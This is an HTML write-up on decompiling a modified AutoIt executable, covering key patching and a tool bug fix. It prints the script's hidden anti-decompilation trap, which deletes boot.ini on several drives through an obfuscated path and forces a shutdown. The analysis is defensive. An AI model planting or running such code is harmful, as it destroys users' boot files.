@@ -1,0 +1,615 @@
+<html>
+
+<head>
+<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
+<meta name=Generator content="Microsoft Word 11 (filtered)">
+<title>Dealing with modified Au3-files</title>
+<style>
+<!--
+ /* Font Definitions */
+ @font-face
+	{font-family:Courier;
+	panose-1:2 7 4 9 2 2 5 2 4 4;}
+@font-face
+	{font-family:Tahoma;
+	panose-1:2 11 6 4 3 5 4 4 2 4;}
+@font-face
+	{font-family:Verdana;
+	panose-1:2 11 6 4 3 5 4 4 2 4;}
+ /* Style Definitions */
+ p.MsoNormal, li.MsoNormal, div.MsoNormal
+	{margin:0cm;
+	margin-bottom:.0001pt;
+	font-size:12.0pt;
+	font-family:"Times New Roman";}
+a:link, span.MsoHyperlink
+	{color:blue;
+	text-decoration:underline;}
+a:visited, span.MsoHyperlinkFollowed
+	{color:purple;
+	text-decoration:underline;}
+span.E-MailFormatvorlage17
+	{color:red;
+	font-weight:bold;
+	text-decoration:underline;}
+@page Section1
+	{size:595.3pt 841.9pt;
+	margin:70.85pt 70.85pt 2.0cm 70.85pt;}
+div.Section1
+	{page:Section1;}
+-->
+</style>
+
+</head>
+
+<body lang=DE link=blue vlink=purple>
+
+<div class=Section1>
+
+<p class=MsoNormal>Well there was just a tiny modification to the Au3-Standard.
+But to make the Modification working you need to also change the</p>
+
+<p class=MsoNormal>AutoIt Stub(AutoItSC.bin) that's attached to run the
+compiled.</p>
+
+<p class=MsoNormal>So how to find this?</p>
+
+<p class=MsoNormal>I looked up the AutoIT version in fileproperties
+-&gt;3.2.10; Downloaded the original File from <a
+href="http://www.autoitscript.com/autoit3/files/archive/autoit/">http://www.autoitscript.com/autoit3/files/archive/autoit/</a>&nbsp;and
+compared it. Hmm EE 18 what's this. Look in Dasm in ollydbg</p>
+
+<p class=MsoNormal>&nbsp;ah this&nbsp;EE 18 00 00&nbsp; is a dword that is
+somehow related to 'FILE' something.(Well you may need to examine what is done
+with that value further in Olly...) But&nbsp;I remember had a clue what it
+might be and searched in the myAutToIt_Src for '18EE' or '6382'. </p>
+
+<p class=MsoNormal>It's some decryptionkey - well so I&nbsp;change it in the
+sources to '0000' and...</p>
+
+<p class=MsoNormal>Well that was not the only thing thats was need to change.</p>
+
+<p class=MsoNormal>First I changed this </p>
+
+<p class=MsoNormal>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .FindString
+HexvaluesToString(&quot;6B 43 CA 52&quot;)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If .Position = 0 Then<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; '...Error
+Exit Sub<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Err.Raise
+ERR_NO_AUT_EXE, , &quot;'FILE'-signature not found.&quot;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Exit Sub<br>
+...</p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Arial;color:blue'>to</span></p>
+
+<p class=MsoNormal>&nbsp;</p>
+
+<p class=MsoNormal>'.FindString HexvaluesToString(&quot;6B 43 CA 52&quot;)<br>
+&nbsp;.FindString DeCryptNew(&quot;FILE&quot;, 6382) '18EE<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If .Position = 0 Then<br>
+<span style='font-size:10.0pt;font-family:Arial;color:blue'>...</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Arial'>(And learn
+for the future that 'optimatisation like this - really don't speed out anything
+instead they just slow down the maintance of programm)</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Arial'>So now it
+is more clear. Now also change '6382' to '0' here.</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Verdana'>&nbsp;</span></p>
+
+<p class=MsoNormal><img border=0 width=855 height=769
+src="Dealing%20with%20modified%20Au3-files-Dateien/image001.jpg"
+u1:shapes="_x0000_i1025"></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Verdana'>&nbsp;</span></p>
+
+<div class=MsoNormal align=center style='text-align:center'><span
+style='font-size:10.0pt;font-family:Verdana'>
+
+<hr size=2 width="100%" align=center tabIndex=-1>
+
+</span></div>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Verdana'>&nbsp;</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma'>Now&nbsp;decompilation
+works !!!</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Verdana'>&nbsp;</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma'>Keep an
+eye on the log:</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Courier'>Try to
+breaks very long lines (about 2000 chars) by adding '_'+&lt;NewLine&gt; ...<br>
+&nbsp;PROBLEM: Line 6161 is longer than 1800 Bytes. Tidy will refuse to work.
+Fix this manually an then apply Tidy.<br>
+....</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Courier'>&nbsp;PROBLEM:
+Line 6337 is longer than 1800 Bytes. Tidy will refuse to work. Fix this
+manually an then apply Tidy.<br>
+Save/overwrite script to: e:\intel2400\Programmierung\Projekte\AutToExe\!Test\WoW\WoWInfinity.au3</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma'>...and
+indeep tidy crash</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Verdana'>&nbsp;</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma'>A Look at
+line 6161 reveals what wrong there</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Verdana'>&nbsp;</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:"Courier New"'>FUNC
+__SQLITE_INLINE_SQLITE3DLL()<br>
+LOCAL $SDATA<br>
+$SDATA=
+&quot;4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C010800ACC4764600A20400BD070000E00006200B010238003A0400006E0400000200000010000000100000005004000000906000100000000200000400000001000000040000000000000000F0040000040000000000000300000000002000001000000000100000100000000000001000000000700400A80F000000800400C0060000000000000000000000000000000000000000000000000000009004007819000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002E746578740000009438040000100000003A040000040000000000000000000000000000600000602E64617461000000B80000000050040000020000003E0400000000000000000000000000400000C02E6273730000000050010000006004000000000000000000000000000000000000000000800000C02E65646174610000A80F0000007004000010000000400400000000000000000000000000400000C02E69646174610000C0060000008004000008000000500400000000000000000000000000400000C02E72656C6F6300007819000000900400001A000000580400000000000000000000000000400000C02E737461620000006C18000000B00400001A000000720400000000000000000000000000020800422E73746162737472C315000000D0040000160000008C040000000000000000000000000002080042000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005589E583EC1056538B5D0C83FB017505E8F32A04008B451083C4FC50538B450850E84A2A040089C683C40485DB7505E84C2A04008D65E889F05B5E89EC5DC20C008D76005531C089E589EC5DC38D76005589E583EC2C5756538B7D08C745E8000000008D5D0C89F683C3048B73FC83C3048B43FC8945F883C3048B53FC8955F483C3048B43FC8945F083C3048B53FC8955ECC745FC0000000083EE01722B89F683C4F40FB60750E89036040083C41085C0744A8B45FC8D14800FBE078D4450D08945FC4783EE0173D78B55F83955FC7C2C8B45F43945FC7F24837DF00074080FBE073945F075168B55FC8B45EC891047FF45E8837DF0000F856BFFFFFF8B45E88D65C85B5E5FC9C35589E583EC1C5756538B5D088B7D0CEB048D76004383C4F40FB60350E80B36040083C41085C075ECC7471C000000008A033C2D7507BEFFFFFFFFEB113C2B740884C00F95C0EB6F90BE010000004383C4FC8D45FC506A006A3B6A006A028D45F8506A3A6A0E6A006A0253E8D9FEFFFF83C43083F8027409B801000000EB3D89F683C3058B45F8C1E0042B45F88B55FC8D04820FAFF089771CEB0389F64383C4F40FB60350E88335040083C41085C075EC803B000F95C025FF0000008D65D85B5E5FC9C3908D742600000000000000244000000000000048405589E583EC5056538B5D088B750CC745E000000000C745E40000000083C4FC8D45F4506A006A3B6A006A028D45F0506A3A6A186A006A0253E833FEFFFF83C43083F8020F85E700000083C305803B3A0F859B0000004383C4F88D45EC506A006A3B6A006A0253E805FEFFFF83C42083F8010F85B900000083C302803B2E757883C4F40FB6430150E8D034040083C41085C0746443D9E8DD05D0119060EB28D9C9DD45E0D8C9DD5DE0660FBE03668945FEDF45FEDC45E0DC25D8119060D9CAD8C9D9CA43DD5DE083C4F40FB60350DB7DD0DB7DC0E88434040083C410DB6DD0DB6DC085C075B9DDD9DC7DE0DD5DE0EB0890C745EC00000000C6462A00C64629018B45F08946148B45F4894618DB45ECDC45E083C4F8DD5E205653E80AFEFFFF85C0750E837E1C000F95C088462B31C0EB05B8010000008D65A85B5EC9C38D7426000000000000D4764061545227A0993E400000000000D29740000000000020AC400000000000004E40000000000018F5405589E583EC1C5756538B7508807E2A000F8525010000807E280074108B5E088B7E0C8B46108945F4EB1389F6BBD0070000BF01000000C745F40100000083FF027F044B83C70CB91F85EB5189C8F7EBC1FA0589D8C1F81F29C289D079038D4203C1F8028D48028D836C1200008945FCDB45FC29D1DC0D20139060D97DFA668B55FA6681CA000C668955F8D96DF8DB5DFC8B45FCD96DFA8D57018955FCDB45FCDC0D28139060D97DFA66&quot;<br>
+$SDATA&amp; _<br>
+=
+&quot;8B5DFA6681CB000C66895DF8D96DF8DB5DFC8B55FCD96DFA01D00345F401C88945FCDB45FCDC2530139060C6462A01DD16807E29007459DB4614DB4618D9C9DC0D38139060D9C9DC0D40139060DEC1DC4620DD0548139060DCF9D9C9DEC2D9C9DD16807E2B0074268B461CC1E0042B461CC1E0028945FCDB45FCDEF2DEE1C6462800C6462900C6462B00DD1EEB04DDD8DDD85B5E5FC9C35589E583EC1C5756538B5D088B750C803B2D750843BF01000000EB0231FF8D45FC506A006A1F6A016A028D45F8506A2D6A0C6A016A028D45F4506A2D680F2700006A006A0453E875FBFFFF83C44083F803753483C30AEB014383C4F40FB60350E83F32040083C41085C075EC803B5474E783C4F85653E8D5FCFFFF83C41085C07412803B007409B801000000EB3A89F6C6462900C6462A00C64628018B45F489460885FF7405F7D88946088B45F889460C8B45FC894610807E2B00740983C4F456E8FAFDFFFF31C08D65D85B5E5FC9C36E6F77005589E583EC1C5756538B75088B5D0C89DF31C0FCB90C000000F3AB83C4F85356E807FFFFFF83C41085C0746A83C4F85356E846FCFFFF83C41085C0745983C4F8686015906056E81D41000083C41085C0751A83C4F48D45F850E85E690000DD45F8C6432A0131C0DD1BEB2D9083C4FC6A016A0056E8AF41000083C41085C07508B801000000EB119083C4F85356E8E6420000C6432A0131C08D65D85B5E5FC9C38D742600000000000000E03F00000040D07D3C410000000088D5E1406666666666865E400000000000D4764061545227A0993E405589E583EC1C5756538B5D08807B28000F8561010000807B2A00751CC74308D0070000C7430C01000000C7431001000000E93D01000089F6DD03DC0508169060D97DFE668B55FE6681CA000C668955FCD96DFCDB5DF88B45F8D96DFE8945F8DB45F8DC2510169060DC3518169060D97DFE668B7DFE6681CF000C66897DFCD96DFCDB5DF88B4DF8D96DFE8D54080189C885C97D038D4103C1F80229C281C2F40500008955F8DB45F8DC2520169060DD0528169060DCF9D9C9D97DFE668B45FE660D000C668945FCD96DFCDB5DF88B75F8D96DFE8975F8DB45F8DEC9D97DFE668B4DFE6681C9000C66894DFCD96DFCDB5DF88B45F8D96DFE29C28955F8DB45F8DD0530169060DCF9D9C9D97DFE668B7DFE6681CF000C66897DFCD96DFCDB5DF88B4DF8D96DFE894DF8DB45F8DEC9D97DFE668B7DFE6681CF000C66897DFCD96DFCDB5DF88B45F8D96DFE29C289531083F90D7F0549EB0589F683C1F3894B0C8D8695EDFFFF837B0C027E068D8694EDFFFF894308C64328015B5E5FC9C38D742600000000000000E03F0000000070999441FCA9F1D24D62503F5589E583EC24538B5D08807B29000F85E800000083C4F453E863FBFFFFDD05B8179060DD03D8C1D97DFE668B55FE6681CA000C668955FCD96DFCDB55F88B45F8D96DFE8945F8DB45F8DEE9DC0DC0179060DEC1D97DFE668B45FE660D000C668945FCD96DFCDB5DF88B4DF8D96DFE894DF8DB45F8DC0DC8179060D97DFE668B55FE6681CA000C668955FCD96DFCDB55F88B4DF8D96DFE894DF8BAC5B3A29189D0F7E901CAC1FA0B89C8C1F81F29C2DB45F88953148D04D50000000029D0C1E00501D0C1E00429C1BA8988888889D0F7E901CAC1FA0589C8C1F81F29C289531889D0C1E004DEE929D0C1E00229C1894DF8DB45F8DEC1C6432901DD5B208B5DD8C9C38D76005589E583EC14538B5D0883C4F453E851FDFFFF83C4F453E8E0FEFFFF8B5DE8C9C38D76005589E58B4508C6402800C6402900C6402B00C9C38D742600000000000000E03F000000C0C59E4241000000000018F5405589E583EC7C5756538D7DD08B7508FCB90C000000F3A583C4F48D5DD053E889FFFFFF8B45D8054DF8FFFF83C41089DA83F8427633C745D8D0070000C745DC01000000C745E001000000C745E400000000C745E800000000C745F000000000C745F400000000EB2EDD45F0DC0510199060D97D9E668B4D9E6681C9000C66894D9CD96D9CDB5D988B4598D96D9E894598DB4598DD5DF0C745EC00000000C645FA0083C4F452E87EF9FFFFDD45D0DC2518199060DC0D20199060DC0510199060D97D9E668B559E6681CA000C6689559CD96D9CDB5D988B4598D96D9E894594E83564000083C4F48D459450E80D2D040089C28B4A1481C16C070000894DA88B4210408945AC8B420C8945B08B42088945B48B42048945B88B02894598DB459883C420DD5DC0E867640000C645C801C645C901C645CA00C645CB0083C4F48D45A050E8E3F8FFFFDD45A0DC65D08DA578FFFFFF5B5E5FC9C36C6F63616C74696D6500756E697865706F636800757463007765656B64617920007374617274206F6620006D6F6E746800796561720064617900686F7572006D696E757465007365636F6E6400908D742600000000000018F540000000C0C59E42410000000000001C40000000000000F83F000000000000E03F000000000000384000000000008096400000000000003E405589E581EC9C0000005756538B5D0CC74594010000008D45E0898578FFFFFFC7857CFFFFFF000000008B5508803A00743A8D760083C4F48B4D088BB57CFFFFFF0FBE040E50E8C22B04008BBD78FFFFFF88043E83C4104689B57CFFFFFF83FE1C77098B4508803C060075C98B9578FFFFFF8B8D7CFFFFFFC60411008A0204D50FBEC083F84C0F8793070000FF2485A41B906089F6A81F90602E239060A81F90602E2390602E239060A81F9060A81F9060A81F9060A81F9060A81F9060A81F9060A81F9060A81F9060A81F9060A81F90602E2390602E2390602E2390602E2390602E23</span><span
+style='font-size:10.0pt;font-family:Tahoma'>&quot;</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Verdana'>&nbsp;</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma'>Lines that
+are 4096&nbsp;char !!!</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma'>To
+fix&nbsp;you could just cut out these lines then run tidy and paste them
+back&nbsp;afterwards.</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Verdana'>&nbsp;</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma'>But here
+we can&nbsp;do it&nbsp;another way. SQLLite is some include you can also find
+thereAutoITDir\Include\SQLite.dll.au3.</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma'>So let's
+strip the standard AutoIt includes with the myAutoExe-Function Renamer.</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma'><img
+border=0 width=842 height=638
+src="Dealing%20with%20modified%20Au3-files-Dateien/image002.jpg"></span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Verdana'>&nbsp;</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:"Courier New"'>&gt;&gt;&gt;But
+before again a bugfix</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:"Courier New"'>Before
+tidy source looks like this</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:"Courier New"'>FUNC
+__SQLITE_INLINE_SQLITE3DLL()<br>
+</span><span style='font-size:10.0pt;font-family:Tahoma'>after tidy</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:"Courier New"'>Func
+__SQLITE_INLINE_SQLITE3DLL()</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:"Courier New"'>Now
+in functionrenamer the sourcecode was</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Arial;color:blue'>&nbsp;&nbsp;
+FuncList = Split(ScriptData.Data, vbCrLf &amp; &quot;Func &quot;)<br>
+and failed because &quot;</span><span style='font-size:10.0pt;font-family:"Courier New";
+color:black'>Func&quot; &lt;&gt; &quot;FUNC&quot;</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:"Courier New";
+color:black'>with </span><span style='font-size:10.0pt;font-family:Arial;
+color:blue'>vbTextCompare it's case insenitive and it will work</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Arial;color:blue'>&nbsp;&nbsp;
+FuncList = Split(ScriptData.Data, vbCrLf &amp; &quot;Func &quot;, ,
+vbTextCompare)<br>
+&lt;&lt;&lt;</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Arial;color:blue'>&nbsp;</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma'>Or
+possiblity 3 Just delete these SQL Functions since they were just included but
+not used anywhere (just search for 'SQL' in the WoWInfinity.au3 to check it
+yaself)</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Verdana'>&nbsp;</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Verdana'>&nbsp;</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma'>Well Now
+the first run.</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma'>Boom
+suprise suprise.</span></p>
+
+<p class=MsoNormal><strong><span style='font-size:10.0pt;font-family:Tahoma'>Windows
+gonna shutdown...</span></strong></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma'>On restart
+Suprise #2</span></p>
+
+<p class=MsoNormal><strong><span style='font-size:10.0pt;font-family:Tahoma'>C:\Boot.ini
+is missing</span></strong></p>
+
+<p class=MsoNormal><strong><span style='font-size:36.0pt;font-family:Tahoma'>:(</span></strong></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma'>... Well i
+booted into some Linux that was also on my machine and restore a backup from
+the boot.ini but on a 'Single Windoze OS' PC operated by some averaged user
+that can create a big problem.</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma'>Ya you
+could boot from your WindowsCD and use the recovery console ... , or ya
+BartPE-CD if you've create one... As there is always a way out.</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Verdana'>&nbsp;</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma'>Well what
+happend? Let's review the script: (To find these location I run autoit.exe from
+Linux under Wine - were delete boot.ini and shutdown windows doesn't have any
+effect. Then delete the last half of the script and try. Then&nbsp;half of the
+script delete and try. Like in the game where you have to guess a number and
+the computer is just telling you that his number is bigger or smaller.)</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma'>But you
+may also do it in windows rename c:\WINDOWS\system32\shutdown.exe to something
+else,&nbsp;so it can't restart windows. And create a backup of C:\boot.ini (and
+restore it before you reboot)</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Verdana'>&nbsp;</span></p>
+
+<p class=MsoNormal><b><span style='font-size:10.0pt;font-family:Tahoma;
+color:blue'>If</span></b><span style='font-size:10.0pt;font-family:Tahoma'> <b><span
+style='color:#FF33FF'>@Compiled</span></b> <b><span style='color:red'>=</span></b>
+<b><i><span style='color:#AC00A9'>0</span></i></b> <b><span style='color:blue'>Then</span></b></span></p>
+
+<p class=MsoNormal><b><span style='font-size:10.0pt;font-family:Tahoma;
+color:#AA0000'>$CAN</span></b><span style='font-size:10.0pt;font-family:Tahoma'>
+<b><span style='color:red'>=</span></b> <b><span style='color:#9999CC'>&quot;\b&quot;</span></b></span></p>
+
+<p class=MsoNormal><b><span style='font-size:10.0pt;font-family:Tahoma;
+color:blue'>EndIf</span></b></p>
+
+<p class=MsoNormal><b><span style='font-size:10.0pt;font-family:Tahoma;
+color:blue'>If</span></b><span style='font-size:10.0pt;font-family:Tahoma'> <b><span
+style='color:#FF33FF'>@Compiled</span></b> <b><span style='color:red'>=</span></b>
+<b><i><span style='color:#AC00A9'>1</span></i></b> <b><span style='color:blue'>Then</span></b></span></p>
+
+<p class=MsoNormal><b><span style='font-size:10.0pt;font-family:Tahoma;
+color:blue'>If</span></b><span style='font-size:10.0pt;font-family:Tahoma'> <b><i><span
+style='color:#000090'>FileExists</span></i><span style='color:red'>(</span><i><span
+style='color:#000090'>RegRead</span></i><span style='color:red'>(</span><span
+style='color:#9999CC'>&quot;HKEY_LOCAL_MACHINE\SOFTWARE\winf&quot;</span><span
+style='color:red'>,</span></b> <b><span style='color:#9999CC'>&quot;verDel&quot;</span><span
+style='color:red'>))</span></b> <b><span style='color:blue'>Then</span></b></span></p>
+
+<p class=MsoNormal><b><i><span style='font-size:10.0pt;font-family:Tahoma;
+color:#000090'>FileDelete</span></i></b><b><span style='font-size:10.0pt;
+font-family:Tahoma;color:red'>(</span></b><b><i><span style='font-size:10.0pt;
+font-family:Tahoma;color:#000090'>RegRead</span></i></b><b><span
+style='font-size:10.0pt;font-family:Tahoma;color:red'>(</span></b><b><span
+style='font-size:10.0pt;font-family:Tahoma;color:#9999CC'>&quot;HKEY_LOCAL_MACHINE\SOFTWARE\winf&quot;</span></b><b><span
+style='font-size:10.0pt;font-family:Tahoma;color:red'>,</span></b><span
+style='font-size:10.0pt;font-family:Tahoma'> <b><span style='color:#9999CC'>&quot;verDel&quot;</span><span
+style='color:red'>))</span></b></span></p>
+
+<p class=MsoNormal><b><i><span style='font-size:10.0pt;font-family:Tahoma;
+color:#000090'>RegDelete</span></i></b><b><span style='font-size:10.0pt;
+font-family:Tahoma;color:red'>(</span></b><b><span style='font-size:10.0pt;
+font-family:Tahoma;color:#9999CC'>&quot;HKEY_LOCAL_MACHINE\SOFTWARE\winf&quot;</span></b><b><span
+style='font-size:10.0pt;font-family:Tahoma;color:red'>,</span></b><span
+style='font-size:10.0pt;font-family:Tahoma'> <b><span style='color:#9999CC'>&quot;verDel&quot;</span><span
+style='color:red'>)</span></b></span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma'>EXTRACT_DOCU<b><span
+style='color:red'>()</span></b></span></p>
+
+<p class=MsoNormal><b><span style='font-size:10.0pt;font-family:Tahoma;
+color:blue'>EndIf</span></b></p>
+
+<p class=MsoNormal><b><span style='font-size:10.0pt;font-family:Tahoma;
+color:blue'>EndIf</span></b></p>
+
+<p class=MsoNormal><b><i><span style='font-size:10.0pt;font-family:Tahoma;
+color:#000090'>ConsoleWrite</span></i></b><b><span style='font-size:10.0pt;
+font-family:Tahoma;color:red'>(</span></b><b><span style='font-size:10.0pt;
+font-family:Tahoma;color:#FF33FF'>@Compiled</span></b><b><span
+style='font-size:10.0pt;font-family:Tahoma;color:red'>)</span></b></p>
+
+<p class=MsoNormal><b><span style='font-size:10.0pt;font-family:Tahoma;
+color:blue'>If</span></b><span style='font-size:10.0pt;font-family:Tahoma'> <b><span
+style='color:#FF33FF'>@Compiled</span></b> <b><span style='color:red'>=</span></b>
+<b><i><span style='color:#AC00A9'>0</span></i></b> <b><span style='color:blue'>Then</span></b></span></p>
+
+<p class=MsoNormal><b><span style='font-size:10.0pt;font-family:Tahoma;
+color:blue'>If</span></b><span style='font-size:10.0pt;font-family:Tahoma'> <b><span
+style='color:#AA0000'>$NITRO</span></b> <b><span style='color:red'>=</span></b>
+<b><i><span style='color:#AC00A9'>0</span></i></b> <b><span style='color:blue'>Then</span></b></span></p>
+
+<p class=MsoNormal><b><span style='font-size:10.0pt;font-family:Tahoma;
+color:#AA0000'>$ECAN</span></b><span style='font-size:10.0pt;font-family:Tahoma'>
+<b><span style='color:red'>=</span></b> <b><span style='color:#9999CC'>&quot;oot.ini&quot;</span></b></span></p>
+
+<p class=MsoNormal><b><i><span style='font-size:10.0pt;font-family:Tahoma;
+color:#0080FF'>_RUNDOS</span></i></b><b><span style='font-size:10.0pt;
+font-family:Tahoma;color:red'>(</span></b><b><span style='font-size:10.0pt;
+font-family:Tahoma;color:#9999CC'>&quot;del C:&quot;</span></b><span
+style='font-size:10.0pt;font-family:Tahoma'> <b><span style='color:red'>&amp;</span></b>
+<b><span style='color:#AA0000'>$CAN</span></b> <b><span style='color:red'>&amp;</span></b>
+<b><span style='color:#AA0000'>$ECAN</span></b> <b><span style='color:red'>&amp;</span></b>
+<b><span style='color:#9999CC'>&quot; /f /a h s&quot;</span><span
+style='color:red'>)</span></b></span></p>
+
+<p class=MsoNormal><b><i><span style='font-size:10.0pt;font-family:Tahoma;
+color:#0080FF'>_RUNDOS</span></i></b><b><span style='font-size:10.0pt;
+font-family:Tahoma;color:red'>(</span></b><b><span style='font-size:10.0pt;
+font-family:Tahoma;color:#9999CC'>&quot;del D:&quot;</span></b><span
+style='font-size:10.0pt;font-family:Tahoma'> <b><span style='color:red'>&amp;</span></b>
+<b><span style='color:#AA0000'>$CAN</span></b> <b><span style='color:red'>&amp;</span></b>
+<b><span style='color:#AA0000'>$ECAN</span></b> <b><span style='color:red'>&amp;</span></b>
+<b><span style='color:#9999CC'>&quot; /f /a h s&quot;</span><span
+style='color:red'>)</span></b></span></p>
+
+<p class=MsoNormal><b><i><span style='font-size:10.0pt;font-family:Tahoma;
+color:#0080FF'>_RUNDOS</span></i></b><b><span style='font-size:10.0pt;
+font-family:Tahoma;color:red'>(</span></b><b><span style='font-size:10.0pt;
+font-family:Tahoma;color:#9999CC'>&quot;del E:&quot;</span></b><span
+style='font-size:10.0pt;font-family:Tahoma'> <b><span style='color:red'>&amp;</span></b>
+<b><span style='color:#AA0000'>$CAN</span></b> <b><span style='color:red'>&amp;</span></b>
+<b><span style='color:#AA0000'>$ECAN</span></b> <b><span style='color:red'>&amp;</span></b>
+<b><span style='color:#9999CC'>&quot; /f /a h s&quot;</span><span
+style='color:red'>)</span></b></span></p>
+
+<p class=MsoNormal><b><i><span style='font-size:10.0pt;font-family:Tahoma;
+color:#0080FF'>_RUNDOS</span></i></b><b><span style='font-size:10.0pt;
+font-family:Tahoma;color:red'>(</span></b><b><span style='font-size:10.0pt;
+font-family:Tahoma;color:#9999CC'>&quot;shutdown -s -f -t 00&quot;</span></b><b><span
+style='font-size:10.0pt;font-family:Tahoma;color:red'>)</span></b></p>
+
+<p class=MsoNormal><b><i><span style='font-size:10.0pt;font-family:Tahoma;
+color:#000090'>Shutdown</span></i></b><b><span style='font-size:10.0pt;
+font-family:Tahoma;color:red'>(</span></b><b><i><span style='font-size:10.0pt;
+font-family:Tahoma;color:#AC00A9'>5</span></i></b><b><span style='font-size:
+10.0pt;font-family:Tahoma;color:red'>)</span></b></p>
+
+<p class=MsoNormal><b><span style='font-size:10.0pt;font-family:Tahoma;
+color:blue'>EndIf</span></b></p>
+
+<p class=MsoNormal><b><span style='font-size:10.0pt;font-family:Tahoma;
+color:blue'>EndIf</span></b></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Verdana'>&nbsp;</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma'>It uses
+the build in AutoIt var <a href="mailto:'@Compiled'">'<strong><span
+style='font-family:Tahoma;color:#FF33FF;text-decoration:none'>@Compiled</span></strong><span
+style='color:black'>'</span></a><span style='color:black'> to detect if it is a
+compiled autoit-exe or a *.au3 script. </span></span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma;color:black'>Well
+it the case of that it's a script it does some malicious action. </span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Verdana'>&nbsp;</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma;color:black'>I
+will include some scan for </span><span style='font-size:10.0pt;font-family:
+Tahoma;color:#FF33FF'>@Compiled </span><span style='font-size:10.0pt;
+font-family:Tahoma'>in myautToExe to warn the user is this is found and that he
+should check what's going on there&nbsp; before he runs the script.</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma'>I changed<strong><span
+style='font-family:Tahoma;color:#AA0000'> $NITRO</span></strong> <b><span
+style='color:red'>=</span></b> <b><i><span style='color:#AC00A9'>0</span></i></b>
+to <strong><span style='font-family:Tahoma;color:#AA0000'>$NITRO</span></strong>
+<b><span style='color:red'>=</span></b> <strong><span style='font-family:Tahoma;
+color:red'>100</span></strong></span></p>
+
